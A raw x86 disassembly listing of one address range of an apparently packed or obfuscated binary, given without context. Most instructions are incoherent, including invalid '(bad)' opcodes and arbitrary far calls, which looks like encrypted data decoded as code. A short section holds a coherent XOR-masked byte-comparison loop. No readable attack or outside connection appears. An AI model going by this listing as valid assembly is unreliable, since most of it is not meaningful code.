  4049b6:	icebp  
  4049b7:	inc    eax
  4049b8:	sub    esp,DWORD PTR [ebp-0x15]
  4049bb:	pop    ss
  4049bc:	call   0x7070:0x21c9f51c
  4049c3:	cmp    eax,0xf070707d
  4049c8:	inc    ecx
  4049c9:	and    ebp,ebp
  4049cb:	in     al,0x57
  4049cd:	cs xchg BYTE PTR ds:[edx+0x25],bh
  4049d2:	dec    eax
  4049d3:	loop   0x4049f0
  4049d5:	push   0x3d
  4049d7:	je     0x40498f
  4049d9:	call   0x5047:0xf2e5d8f4
  4049e0:	dec    ebp
  4049e1:	ins    DWORD PTR es:[edi],dx
  4049e2:	int    0xe7
  4049e4:	xor    eax,0x3d2752bb
  4049e9:	pop    esp
  4049ea:	xchg   ebx,eax
  4049eb:	and    ecx,DWORD PTR [ebp-0x3189f971]
  4049f1:	pop    esi
  4049f2:	xor    al,0x60
  4049f4:	jp     0x404a60
  4049f6:	ficomp DWORD PTR [esi+edx*8-0x480b573b]
  4049fd:	mov    ecx,0xf0b11bfd
  404a02:	loopne 0x404a3e
  404a04:	popa   
  404a05:	add    edx,DWORD PTR [ecx-0x44442cc5]
  404a0b:	jbe    0x4049dc
  404a0d:	xor    DWORD PTR ss:[edi-0x768069cc],edx
  404a14:	sub    al,0xcd
  404a16:	jnp    0x4049cb
  404a18:	sbb    ebp,DWORD PTR [ebp-0x1b]
  404a1b:	mov    dl,0x3d
  404a1d:	cwde   
  404a1e:	xchg   ecx,eax
  404a1f:	out    dx,eax
  404a20:	mov    ecx,0xb5207a53
  404a25:	or     cl,BYTE PTR [ecx]
  404a27:	sbb    al,0xdf
  404a29:	and    ah,al
  404a2b:	lods   eax,DWORD PTR ds:[esi]
  404a2c:	mov    edx,0xc3a78461
  404a31:	fld    QWORD PTR [edx-0x21df0d15]
  404a37:	pop    esp
  404a38:	mov    ah,0xdc
  404a3a:	xchg   DWORD PTR [esi+0x4b],edi
  404a3d:	inc    esp
  404a3e:	mov    ?,WORD PTR [ecx+0x9c8685f]
  404a44:	push   ss
  404a45:	mov    esp,0x38a44f26
  404a4a:	jno    0x404a4c
  404a4c:	mov    ecx,0x235498ce
  404a51:	xor    esi,DWORD PTR [esp+esi*1+0x7c25b4a0]
  404a58:	loope  0x4049f6
  404a5a:	push   ebp
  404a5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a5c:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a5e:	mov    ?,WORD PTR [edx-0x4e41950]
  404a64:	stos   BYTE PTR es:[edi],al
  404a65:	fnstenv [edx]
  404a67:	lock sbb al,0xc8
  404a6a:	test   eax,0x4db8124
  404a6f:	sub    al,0x5b
  404a71:	leave  
  404a72:	(bad)  
  404a73:	loopne 0x404a7f
  404a75:	fld    DWORD PTR [eax-0x2e56878]
  404a7b:	add    al,0x2a
  404a7d:	or     eax,0x5fd1c3a8
  404a82:	sub    DWORD PTR ds:0x167608fa,edx
  404a88:	mov    WORD PTR ds:0x6840bcee,es
  404a8e:	xchg   esi,eax
  404a8f:	in     al,0xf5
  404a91:	dec    esp
  404a92:	loopne 0x404b0e
  404a94:	popf   
  404a95:	inc    edx
  404a96:	call   0x49d0:0xf522bb3f
  404a9d:	inc    ebx
  404a9e:	push   0xf5433e8f
  404aa3:	adc    ch,BYTE PTR [ebx]
  404aa5:	cmp    al,cl
  404aa7:	pop    ss
  404aa8:	xlat   BYTE PTR ds:[ebx]
  404aa9:	push   0xffffffa3
  404aab:	jns    0x404aba
  404aad:	xchg   ecx,eax
  404aae:	sub    eax,0x585e45f5
  404ab3:	and    DWORD PTR [esi],eax
  404ab5:	and    DWORD PTR [ebx-0x22797aef],eax
  404abb:	jae    0x404a71
  404abd:	xor    ecx,DWORD PTR [ebp+0x65]
  404ac0:	sbb    BYTE PTR [esi-0x76],bl
  404ac3:	or     al,BYTE PTR [eax+0x1c3a4d63]
  404ac9:	repz pop eax
  404acb:	fs lahf 
  404acd:	inc    ebp
  404ace:	adc    ebp,0x16de90de
  404ad4:	inc    eax
  404ad5:	push   es
  404ad6:	mov    ebp,0x3c4fcf35
  404adb:	cdq    
  404adc:	xor    eax,0x9bec1341
  404ae1:	dec    ecx
  404ae2:	sub    esi,DWORD PTR [ecx]
  404ae4:	jns    0x404ab5
  404ae6:	into   
  404ae7:	std    
  404ae8:	ds push ecx
  404aea:	test   eax,0x27f2ca79
  404aef:	inc    ebp
  404af0:	push   eax
  404af1:	or     DWORD PTR [edx+0x44710b1d],edx
  404af7:	lods   al,BYTE PTR ds:[esi]
  404af8:	fstp   TBYTE PTR [edx+0xeab9f14]
  404afe:	imul   ebx,DWORD PTR [edx+0x55],0xffffffe0
  404b02:	pop    ebp
  404b03:	pop    edx
  404b04:	fwait
  404b05:	daa    
  404b06:	xchg   BYTE PTR [edi+0x35],bh
  404b09:	mov    eax,0x9cdf75e3
  404b0e:	pop    es
  404b0f:	jge    0x404b66
  404b11:	or     BYTE PTR [edx+0x335ef0f7],bl
  404b17:	pop    esi
  404b18:	jle    0x404b2b
  404b1a:	push   es
  404b1b:	push   ebx
  404b1c:	xor    eax,0x237d86cf
  404b21:	add    eax,0x11dbc148
  404b26:	cs sar cl,1
  404b29:	xor    ch,BYTE PTR [esi+0x16304b12]
  404b2f:	mov    ds:0x8ea77911,al
  404b34:	mov    al,BYTE PTR [esp+ebp*4+0x714d335f]
  404b3b:	inc    edx
  404b3c:	xor    al,0x77
  404b3e:	aas    
  404b3f:	xchg   edi,eax
  404b40:	mov    bh,0xa0
  404b42:	pop    ss
  404b43:	xchg   BYTE PTR [ecx+0x1a],ch
  404b46:	dec    ecx
  404b47:	or     bh,ah
  404b49:	pop    ds
  404b4a:	hlt    
  404b4b:	rol    DWORD PTR ds:[ecx-0x5bd3927a],1
  404b52:	dec    eax
  404b53:	retf   
  404b54:	cmp    al,0x6c
  404b56:	and    ebx,esi
  404b58:	pop    ebp
  404b59:	push   DWORD PTR [ebp+0x6e6017a5]
  404b5f:	cdq    
  404b60:	adc    dh,BYTE PTR ss:[ebp+0x615e6380]
  404b67:	xchg   esp,eax
  404b68:	stc    
  404b69:	retf   0x4208
  404b6c:	inc    ecx
  404b6d:	jbe    0x404b74
  404b6f:	sub    eax,0x66393fac
  404b74:	sahf   
  404b75:	mov    bl,0xad
  404b77:	(bad)  
  404b79:	mov    edi,0x904339a5
  404b7e:	adc    DWORD PTR [ecx],0xa384ddc9
  404b84:	push   ds
  404b85:	pop    edi
  404b86:	jmp    0x404bf8
  404b88:	adc    ebp,DWORD PTR [ebx+0x43]
  404b8b:	add    BYTE PTR [ebx+0x1090bbe5],dl
  404b91:	imul   esi,DWORD PTR [ecx+0x77824237],0xffffff8e
  404b98:	mov    BYTE PTR [edx+0x7ef77324],dl
  404b9e:	into   
  404b9f:	pop    es
  404ba0:	pop    ebp
  404ba1:	imul   DWORD PTR [edx]
  404ba3:	mov    DWORD PTR [eax+0x27ad67e0],ecx
  404ba9:	mov    ebp,0xacaa879e
  404bae:	enter  0x7619,0x87
  404bb2:	pop    edx
  404bb3:	nop
  404bb4:	in     eax,0xf2
  404bb6:	aaa    
  404bb7:	pop    esp
  404bb8:	lods   eax,DWORD PTR ds:[esi]
  404bb9:	(bad)  [edi+0x22d7893d]
  404bbf:	add    DWORD PTR [eax-0x74],eax
  404bc2:	xor    al,0xa9
  404bc4:	and    DWORD PTR [edi],edi
  404bc6:	rcr    al,cl
  404bc8:	fnstsw WORD PTR [ebp-0x2d52b347]
  404bce:	mov    eax,0x7f572f6c
  404bd3:	test   eax,0x34e8eee6
  404bd8:	cld    
  404bd9:	out    0xbd,al
  404bdb:	dec    ebp
  404bdc:	or     eax,0xe929bd27
  404be1:	adc    al,0xf
  404be3:	sbb    eax,0xdbdcb8af
  404be8:	sbb    dh,bl
  404bea:	sub    al,0x8c
  404bec:	loopne 0x404bed
  404bee:	adc    eax,0x5157ae7d
  404bf3:	es (bad) 
  404bf5:	dec    ebx
  404bf6:	scas   eax,DWORD PTR es:[edi]
  404bf7:	and    ecx,ebp
  404bf9:	dec    esp
  404bfa:	inc    ebx
  404bfb:	(bad)  
  404bfc:	push   0x6e
  404bfe:	sahf   
  404bff:	mov    al,ds:0x7a153d1b
  404c04:	jno    0x404c55
  404c06:	adc    ebx,DWORD PTR [ecx]
  404c08:	data16 sbb al,0x4
  404c0b:	mov    dh,al
  404c0d:	add    ah,BYTE PTR [edi+ecx*2-0x400b142c]
  404c14:	mov    eax,0x4838329f
  404c19:	arpl   WORD PTR [edx-0x7bb9bb84],bx
  404c1f:	pushf  
  404c20:	ds and edx,ebx
  404c23:	mov    bl,bl
  404c25:	ds jo  0x404c21
  404c28:	retf   
  404c29:	bound  eax,QWORD PTR [ebx-0x3f689e48]
  404c2f:	add    al,al
  404c31:	add    al,0x4
  404c33:	out    0x4c,eax
  404c35:	test   edx,0x45cf98a2
  404c3b:	add    cl,BYTE PTR [eax+esi*8+0x4d]
  404c3f:	and    eax,0xf4d0040f
  404c44:	dec    ebx
  404c45:	nop
  404c46:	fild   WORD PTR ss:[edx-0x42]
  404c4b:	sub    cl,BYTE PTR [ecx+0x7c]
  404c4e:	ss push cs
  404c50:	je     0x404c49
  404c52:	aas    
  404c53:	mov    al,0xbc
  404c55:	push   0xffffffdc
  404c57:	cmp    eax,0xdaca237
  404c5c:	scas   al,BYTE PTR es:[edi]
  404c5d:	daa    
  404c5e:	loop   0x404c2f
  404c60:	sbb    bh,BYTE PTR [edx+ebx*1]
  404c63:	fucomip st,st(0)
  404c65:	and    esp,ebp
  404c67:	push   ecx
  404c68:	sbb    al,0xd6
  404c6a:	inc    ebx
  404c6b:	jnp    0x404cc1
  404c6d:	test   edi,edx
  404c6f:	mov    ch,0xb1
  404c71:	xchg   ecx,eax
  404c72:	aaa    
  404c73:	test   al,0xb7
  404c75:	pop    ss
  404c76:	imul   DWORD PTR [ecx-0x6f]
  404c79:	xor    al,0x10
  404c7b:	ret    0x173
  404c7e:	mov    ecx,0xe73c0e5d
  404c83:	dec    ebx
  404c84:	mov    esp,0x506122d3
  404c89:	cmp    al,BYTE PTR [ebp+0x5691ebb]
  404c8f:	stos   BYTE PTR es:[edi],al
  404c90:	and    eax,0x913c71c5
  404c95:	cdq    
  404c96:	mov    bl,bl
  404c98:	inc    esi
  404c99:	pop    ecx
  404c9a:	pop    DWORD PTR ds:0x14c6d807
  404ca0:	xchg   ebx,eax
  404ca1:	xor    cl,bh
  404ca3:	leave  
  404ca4:	jl     0x404d18
  404ca6:	loopne 0x404c50
  404ca8:	sub    edi,esp
  404caa:	sbb    ebp,DWORD PTR [edi]
  404cac:	lahf   
  404cad:	lock sub al,BYTE PTR [ebp-0x4639bbac]
  404cb4:	add    dl,dh
  404cb6:	ret    
  404cb7:	xlat   BYTE PTR ds:[ebx]
  404cb8:	push   0x4d
  404cba:	(bad)  
  404cbb:	sbb    eax,esp
  404cbd:	(bad)  
  404cbe:	push   eax
  404cbf:	cwde   
  404cc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cc1:	sti    
  404cc2:	or     al,0x16
  404cc4:	daa    
  404cc5:	mov    bl,0xcc
  404cc7:	inc    eax
  404cc8:	dec    eax
  404cc9:	cmc    
  404cca:	push   es
  404ccb:	mov    dl,0xa4
  404ccd:	sahf   
  404cce:	xchg   BYTE PTR [edi+0x27f2408],dh
  404cd4:	mov    dh,0xc6
  404cd6:	adc    eax,0x79aeb78
  404cdb:	hlt    
  404cdc:	imul   BYTE PTR [esp+ebx*2-0x1c]
  404ce0:	or     cl,BYTE PTR [ebx+ebp*2]
  404ce3:	sub    edi,0x41
  404ce6:	xor    BYTE PTR [edi-0x3676f306],0x2a
  404ced:	loop   0x404d6b
  404cef:	int3   
  404cf0:	loop   0x404d24
  404cf2:	fsubr  DWORD PTR [ecx+edx*4-0x4de5c59f]
  404cf9:	lods   al,BYTE PTR ds:[esi]
  404cfa:	adc    BYTE PTR [eax-0x3b],bl
  404cfd:	shr    BYTE PTR [ebx],0x53
  404d00:	jmp    0x9a4338f5
  404d05:	pusha  
  404d06:	push   edi
  404d07:	(bad)  
  404d08:	mov    ebp,0xc7c70374
  404d0d:	add    eax,0x42e77f
  404d12:	pop    eax
  404d13:	push   cs
  404d14:	add    BYTE PTR [eax],al
  404d16:	mov    edi,DWORD PTR [ebp-0x14]
  404d19:	mov    DWORD PTR ds:0x42e76b,0x3918
  404d23:	mov    BYTE PTR [ebp+edi*1-0x58],al
  404d27:	jmp    0x405087
  404d2c:	or     DWORD PTR [ebp-0x1d],esi
  404d2f:	daa    
  404d30:	arpl   WORD PTR [ecx+0x5bcd71c9],si
  404d36:	fisttp QWORD PTR [eax+0x2b]
  404d39:	add    al,0x95
  404d3b:	ins    BYTE PTR es:[edi],dx
  404d3c:	xchg   esi,eax
  404d3d:	cs jo  0x404db0
  404d40:	cmp    eax,0xce70707d
  404d45:	mov    BYTE PTR [ebx-0xa3e937e],al
  404d4b:	jmp    0x404da7
  404d4d:	sbb    ebx,esp
  404d4f:	and    al,0x4e
  404d51:	mul    DWORD PTR [edi]
  404d53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d54:	adc    al,BYTE PTR [ecx-0x755464d4]
  404d5a:	cdq    
  404d5b:	push   ebx
  404d5c:	xchg   ch,ch
  404d5e:	xchg   edi,eax
  404d5f:	outs   dx,DWORD PTR ds:[esi]
  404d60:	into   
  404d61:	push   ebp
  404d62:	repz mov ?,WORD PTR [ebx]
  404d65:	(bad)  
  404d66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d67:	popf   
  404d68:	and    DWORD PTR [ebx],0x1a8dc69a
  404d6e:	push   ebp
  404d6f:	loop   0x404dbe
  404d71:	jmp    0x3e38:0xa142abb5
  404d78:	cmp    dh,ch
  404d7a:	and    DWORD PTR [ebx],0x793139cb
  404d80:	rcr    DWORD PTR [edx-0x303da4a5],1
  404d86:	jnp    0x404d47
  404d88:	sbb    DWORD PTR cs:[esi-0x6483dd4a],edx
  404d8f:	jae    0x404daf
  404d91:	in     eax,dx
  404d92:	scas   al,BYTE PTR es:[edi]
  404d93:	mov    ah,0xb8
  404d95:	iret   
  404d96:	adc    eax,0xd25fd955
  404d9b:	jae    0x404d81
  404d9d:	mov    bl,0x1
  404d9f:	sub    ah,BYTE PTR [eax+0x90ead12]
  404da5:	and    ah,ch
  404da7:	mov    ebx,0xc3101b79
  404dac:	push   0x6f
  404dae:	shl    BYTE PTR [ebx],1
  404db0:	(bad)  
  404db1:	dec    DWORD PTR [ebx+ebp*4]
  404db4:	mov    al,ds:0xed03949c
  404db9:	xlat   BYTE PTR ds:[ebx]
  404dba:	pop    ds
  404dbb:	push   ebx
  404dbc:	pusha  
  404dbd:	ds ins BYTE PTR es:[edi],dx
  404dbf:	mov    edx,0x8b4965f
  404dc4:	sbb    cl,bl
  404dc6:	sbb    BYTE PTR [ebp+0x4],al
  404dc9:	loope  0x404d91
  404dcb:	push   edx
  404dcc:	pop    ds
  404dcd:	mov    esp,DWORD PTR [esi+ebp*1]
  404dd0:	jns    0x404e3d
  404dd2:	jmp    0x4d4b:0x61b758ca
  404dd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404dda:	(bad)  
  404ddb:	retf   0xff05
  404dde:	pandn  mm4,QWORD PTR [ecx-0x4ab47206]
  404de5:	pusha  
  404de6:	xchg   edx,eax
  404de7:	mov    eax,0xefee8324
  404dec:	add    eax,0x50a71697
  404df1:	mov    bl,BYTE PTR [esi-0x2b]
  404df4:	cmp    BYTE PTR [ebx],ch
  404df6:	mov    esi,0x4306887e
  404dfb:	pushf  
  404dfc:	mov    al,ds:0xabdb54e
  404e01:	fistp  QWORD PTR [ebx]
  404e03:	lahf   
  404e04:	inc    ebp
  404e05:	mov    ebx,0xcb67f4db
  404e0a:	daa    
  404e0b:	jge    0x404d94
  404e0d:	(bad)  
  404e0e:	daa    
  404e0f:	(bad)  
  404e10:	loop   0x404e54
  404e12:	cmp    eax,0xa4eb586a
  404e17:	imul   eax,DWORD PTR [esi-0x19],0x26e3fc13
  404e1e:	pop    ebp
  404e1f:	inc    esi
  404e20:	jg     0x404e6c
  404e22:	int3   
  404e23:	test   BYTE PTR ds:0xbcea7885,0x83
  404e2a:	(bad)  
  404e2b:	push   ecx
  404e2c:	fst    QWORD PTR [ebx+ecx*2]
  404e2f:	test   al,0x4e
  404e31:	jb     0x404e69
  404e33:	(bad)  
  404e35:	sbb    DWORD PTR ds:0x9c9335c6,ebp
  404e3b:	out    dx,al
  404e3c:	(bad)  [ebp-0x1287a08c]
  404e42:	test   al,0x1a
  404e44:	(bad)  
  404e45:	jne    0x404e94
  404e47:	or     eax,0xe1ce021f
  404e4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e4d:	fwait
  404e4e:	or     BYTE PTR [ebx-0x56],bh
  404e51:	pop    DWORD PTR [edi]
  404e53:	jp     0x404e06
  404e55:	and    ch,BYTE PTR [edi+0x7]
  404e58:	es or  dl,ch
  404e5b:	cmp    al,0x43
  404e5d:	mov    ecx,0x13cae0f2
  404e62:	cmovbe edi,DWORD PTR [esi]
  404e65:	sub    al,0x88
  404e67:	lods   al,BYTE PTR ds:[esi]
  404e68:	jns    0x404e09
  404e6a:	and    al,0x1b
  404e6c:	push   eax
  404e6d:	jnp    0x404e6c
  404e6f:	sbb    dl,al
  404e71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e72:	bound  ebx,QWORD PTR [esi-0x522127df]
  404e78:	outs   dx,DWORD PTR ds:[esi]
  404e79:	arpl   WORD PTR [edx+0x3638d9dc],dx
  404e7f:	sbb    ah,dl
  404e81:	(bad)  
  404e82:	sub    al,0x7c
  404e84:	out    0x15,al
  404e86:	push   eax
  404e87:	shr    esp,1
  404e89:	pop    esp
  404e8a:	sub    DWORD PTR [ecx-0x53e37770],edi
  404e90:	and    al,0xc1
  404e92:	or     BYTE PTR [ebx],al
  404e94:	out    0x25,eax
  404e96:	mov    ebx,0x6779e008
  404e9b:	pop    edx
  404e9c:	cmp    DWORD PTR [ecx+ecx*2-0x16],ebx
  404ea0:	sub    eax,0x8b9a207d
  404ea5:	mov    dl,dh
  404ea7:	setl   BYTE PTR [eax]
  404eaa:	call   DWORD PTR [edi-0x1a]
  404ead:	mov    dl,al
  404eaf:	aam    0x66
  404eb1:	push   0xffffffac
  404eb3:	push   eax
  404eb4:	test   eax,0xf1211c2f
  404eb9:	je     0x404e4c
  404ebb:	shr    DWORD PTR [ecx-0x69],cl
  404ebe:	mov    ds:0x5363d17e,al
  404ec3:	cmp    BYTE PTR [ebp-0x44],al
  404ec6:	mov    al,ds:0x3dcb13db
  404ecb:	inc    eax
  404ecc:	rcr    BYTE PTR [ebp+0x7ed235da],1
  404ed2:	in     eax,0x29
  404ed4:	jge    0x404e6b
  404ed6:	cmp    al,0xf6
  404ed8:	lods   eax,DWORD PTR ds:[esi]
  404ed9:	fcmove st,st(0)
  404edb:	dec    eax
  404edc:	clc    
  404edd:	or     ebp,edi
  404edf:	pushf  
  404ee0:	cdq    
  404ee1:	fcmovbe st,st(6)
  404ee3:	push   ss
  404ee4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ee5:	mov    ecx,0x3abe7522
  404eea:	cmp    DWORD PTR [edi],ebx
  404eec:	iret   
  404eed:	popw   ss
  404eef:	add    eax,0x6cd268f0
  404ef4:	jae    0x404f4d
  404ef6:	fst    QWORD PTR [ebx+edi*8-0x18565c1e]
  404efd:	(bad)  
  404efe:	mov    eax,0x1603b160
  404f03:	sbb    DWORD PTR [ecx+0x4d3f7507],esp
  404f09:	(bad)  
  404f0a:	clc    
  404f0b:	adc    esp,DWORD PTR [ebx-0xb]
  404f0e:	imul   ebp,DWORD PTR [ebx],0x17
  404f11:	adc    ah,BYTE PTR [eax+eiz*4+0x3]
  404f15:	jns    0x404e9f
  404f17:	ret    0x4336
  404f1a:	out    dx,eax
  404f1b:	pop    es
  404f1c:	je     0x404eb6
  404f1e:	push   ebp
  404f1f:	adc    ecx,DWORD PTR ds:0x9925042
  404f25:	imul   ebp,DWORD PTR [ebx+eiz*2],0xffffffab
  404f29:	add    al,dl
  404f2b:	push   eax
  404f2c:	lods   eax,DWORD PTR ds:[esi]
  404f2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f2e:	adc    bl,0xc2
  404f31:	fsub   st(7),st
  404f33:	jle    0x404f65
  404f35:	mov    ch,0x2c
  404f37:	sahf   
  404f38:	ror    BYTE PTR [edi+0x7b],cl
  404f3b:	inc    ebp
  404f3c:	fwait
  404f3d:	shl    BYTE PTR [edi],1
  404f3f:	or     eax,0x30c4ab73
  404f44:	mov    dl,0x3a
  404f46:	mov    ebx,0x49276f7d
  404f4b:	inc    ebp
  404f4c:	mov    ebx,0x9cba7dc
  404f51:	pushf  
  404f52:	test   eax,0xcf0120d2
  404f57:	dec    esi
  404f58:	add    esp,edi
  404f5a:	sbb    ch,BYTE PTR [ebx+0x65246191]
  404f60:	dec    ebp
  404f61:	xor    DWORD PTR [ecx+eiz*1-0x4a21259d],eax
  404f68:	out    dx,eax
  404f69:	enter  0xb00d,0xb7
  404f6d:	inc    esi
  404f6e:	xchg   esp,eax
  404f6f:	mov    ah,BYTE PTR [edi]
  404f71:	cmp    esi,eax
  404f73:	pop    ebp
  404f74:	mov    ah,0x52
  404f76:	test   al,0x14
  404f78:	je     0x404f61
  404f7a:	inc    edx
  404f7b:	cdq    
  404f7c:	add    al,0x5e
  404f7e:	in     al,dx
  404f7f:	repnz sar DWORD PTR [edx-0x6a722c7d],cl
  404f86:	adc    ah,ch
  404f88:	adc    eax,DWORD PTR [ebp+0x511a3174]
  404f8e:	and    esi,DWORD PTR [esi+0x5b]
  404f91:	cwde   
  404f92:	pop    esi
  404f93:	add    al,bl
  404f95:	(bad)  
  404f96:	sahf   
  404f97:	out    dx,eax
  404f98:	or     al,0x52
  404f9a:	addr16 push eax
  404f9c:	cmp    BYTE PTR [ebx+eiz*8-0x6],dl
  404fa0:	jg     0x404f71
  404fa2:	or     esi,DWORD PTR [esi]
  404fa4:	or     edx,DWORD PTR [ebp+edi*8-0x19]
  404fa8:	dec    eax
  404fa9:	test   DWORD PTR [edi+0x377a1f77],edi
  404faf:	shl    DWORD PTR [ecx+0x52],1
  404fb2:	jp     0x404f6b
  404fb4:	jge    0x404f59
  404fb6:	aaa    
  404fb7:	fwait
  404fb8:	js     0x405009
  404fba:	xor    DWORD PTR [ebx],0x29fb8bf0
  404fc0:	fs or  al,0x45
  404fc3:	out    dx,eax
  404fc4:	add    eax,0x7828a543
  404fc9:	rol    DWORD PTR [ebx+0x4a],0x4b
  404fcd:	cmc    
  404fce:	xchg   edi,eax
  404fcf:	dec    edi
  404fd0:	fisub  WORD PTR [ebp-0x1ddb0819]
  404fd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fd7:	push   ecx
  404fd8:	inc    esp
  404fd9:	dec    eax
  404fda:	dec    esi
  404fdb:	fnsave [esi-0x79]
  404fde:	push   esi
  404fdf:	lods   eax,DWORD PTR es:[esi]
  404fe1:	pop    esi
  404fe2:	jle    0x405038
  404fe4:	bound  eax,QWORD PTR [ecx]
  404fe6:	cdq    
  404fe7:	(bad)  
  404fe8:	dec    esi
  404fe9:	call   0x2106:0x873e200d
  404ff0:	sbb    ah,BYTE PTR [ebx+0x3f]
  404ff3:	addr16 hlt 
  404ff5:	fiadd  WORD PTR [ecx]
  404ff7:	test   bh,al
  404ff9:	int3   
  404ffa:	add    DWORD PTR [edi+0x8],esi
  404ffd:	cmp    ebp,0x4e37a874
  405003:	stos   BYTE PTR es:[edi],al
  405004:	(bad)  
  405005:	xchg   edx,eax
  405006:	fstp   DWORD PTR [esi]
  405008:	push   ebp
  405009:	aaa    
  40500a:	adc    esp,esi
  40500c:	ins    DWORD PTR es:[edi],dx
  40500d:	xchg   esp,eax
  40500e:	mov    eax,ds:0x459485a7
  405013:	push   cs
  405014:	push   edi
  405015:	gs ins DWORD PTR es:[edi],dx
  405017:	popf   
  405018:	dec    esp
  405019:	(bad)  
  40501b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40501c:	jae    0x405019
  40501e:	mov    bl,0x29
  405020:	das    
  405021:	jg     0x405033
  405023:	add    al,0x6a
  405025:	mov    ebx,0xa7db24b4
  40502a:	mov    bh,0x69
  40502c:	cmp    al,0x97
  40502e:	push   edx
  40502f:	cmp    eax,0xd6f304ff
  405034:	into   
  405035:	je     0x4050b5
  405037:	shr    esp,cl
  405039:	dec    ecx
  40503a:	xchg   edx,eax
  40503b:	cmp    DWORD PTR [ebp+0x653dea33],ecx
  405041:	mov    WORD PTR fs:[esi-0x2],ds
  405045:	loop   0x404feb
  405047:	jp     0x4050c6
  405049:	jmp    0x405042
  40504b:	cmp    al,0xd3
  40504d:	pusha  
  40504e:	adc    BYTE PTR [esi-0x2c],dl
  405051:	fbld   TBYTE PTR [edi+esi*1-0xead6037]
  405058:	fiadd  WORD PTR [eax-0x75]
  40505b:	dec    ebp
  40505c:	mov    dh,0x93
  40505e:	(bad)  
  40505f:	jbe    0x404fff
  405061:	jp     0x40500c
  405063:	fwait
  405064:	push   esi
  405065:	lods   al,BYTE PTR ds:[esi]
  405066:	sti    
  405067:	pop    es
  405068:	hlt    
  405069:	sub    BYTE PTR [eax-0x195c1649],0x5b
  405070:	shr    BYTE PTR [esi],cl
  405072:	dec    edi
  405073:	imul   BYTE PTR fs:[ebx+0x5dcbc623]
  40507a:	bound  ebx,QWORD PTR [ebx+0x31]
  40507d:	mov    dh,0x12
  40507f:	adc    BYTE PTR [esi+0xd5a387b],cl
  405085:	lods   eax,DWORD PTR ds:[esi]
  405086:	je     0x405013
  405088:	inc    ebp
  405089:	hlt    
  40508a:	inc    edx
  40508b:	cmp    edx,eax
  40508d:	jne    0x40493d
  405093:	pop    edi
  405094:	pop    ebx
  405095:	mov    eax,DWORD PTR [ebp-0x8]
  405098:	mov    edx,DWORD PTR [ebp+0x10]
  40509b:	xor    eax,ecx
  40509d:	add    eax,esi
  40509f:	mov    DWORD PTR [edx],eax
  4050a1:	mov    eax,DWORD PTR [ebp-0x8]
  4050a4:	xor    eax,ecx
  4050a6:	add    eax,esi
  4050a8:	mov    DWORD PTR [ebp+0x8],eax
  4050ab:	mov    eax,DWORD PTR [ebp+0x8]
  4050ae:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050b2:	mov    dl,BYTE PTR [ebp-0x1]
  4050b5:	cmp    al,dl
  4050b7:	je     0x4050fa
  4050bd:	mov    eax,DWORD PTR [ebp+0x8]
  4050c0:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4050c4:	mov    edx,DWORD PTR [ebp+0xc]
  4050c7:	cmp    al,BYTE PTR [edx]
  4050c9:	jne    0x405480
  4050cf:	mov    eax,DWORD PTR [ebp-0x8]
  4050d2:	mov    edx,DWORD PTR [ebp+0xc]
  4050d5:	movsx  edx,BYTE PTR [edx]
  4050d8:	xor    eax,ecx
  4050da:	add    eax,esi
  4050dc:	cmp    edx,eax
  4050de:	je     0x405114
  4050e4:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4050eb:	lea    eax,[ebp-0x18]
  4050ee:	mov    DWORD PTR [ebp-0x14],eax
  4050f1:	mov    eax,DWORD PTR [ebp-0x14]
  4050f4:	add    DWORD PTR [eax],0x705fa8f
  4050fa:	mov    eax,DWORD PTR [ebp-0x10]
  4050fd:	mov    edx,DWORD PTR [ebp+0x8]
  405100:	xor    eax,ecx
  405102:	lea    eax,[eax+edx*1+0x32729c]
  405109:	mov    DWORD PTR [ebp+0x8],eax
  40510c:	inc    DWORD PTR [ebp+0xc]
  40510f:	jmp    0x4050ab
  405114:	mov    eax,DWORD PTR [ebp-0x10]
  405117:	xor    eax,ecx
  405119:	mov    ecx,DWORD PTR [ebp+0x10]
  40511c:	add    eax,esi
  40511e:	mov    DWORD PTR [ecx],eax
  405120:	jmp    0x405480
  405125:	xchg   edi,eax
  405126:	rol    DWORD PTR ds:0xb5744198,1
  40512c:	icebp  
  40512d:	lods   al,BYTE PTR ds:[esi]
  40512e:	add    al,0x98
  405130:	shl    DWORD PTR [edx-0x61],0x8b
  405134:	rcpps  xmm5,XMMWORD PTR [ebx]
  405137:	jo     0x4051a9
  405139:	cmp    eax,0x6c70707d
  40513e:	push   ds
  40513f:	or     esp,DWORD PTR [esi-0x5fcd7173]
  405145:	jl     0x405126
  405147:	rcl    edx,0x9c
  40514a:	sub    BYTE PTR [eax-0x27],0x36
  40514e:	bound  esi,QWORD PTR ds:[eax-0xbf933c6]
  405155:	sub    ebx,DWORD PTR [edi+0x1c062952]
  40515b:	add    bl,BYTE PTR [edx]
  40515d:	outs   dx,DWORD PTR ds:[esi]
  40515e:	out    0x9,eax
  405160:	rol    DWORD PTR [esi-0x3dfe5402],cl
  405166:	mov    dl,0x25
  405168:	or     BYTE PTR [ebx+0x66],dh
  40516b:	fst    QWORD PTR [ebp+0x6d4118de]
  405171:	gs jp  0x40518d
  405174:	cld    
  405175:	inc    ebx
  405176:	xchg   ebx,eax
  405177:	repz adc BYTE PTR [ecx-0x74],dh
  40517b:	adc    DWORD PTR [eax+0x7161172c],esp
  405181:	enter  0xb634,0xbb
  405185:	and    eax,0x223e50b6
  40518a:	dec    esp
  40518b:	fisub  DWORD PTR [ecx+0x76]
  40518e:	or     al,0xfb
  405190:	into   
  405191:	js     0x405168
  405193:	add    bh,BYTE PTR [ebp-0x10]
  405196:	pop    ecx
  405197:	cs mov ebx,0x722e7d9e
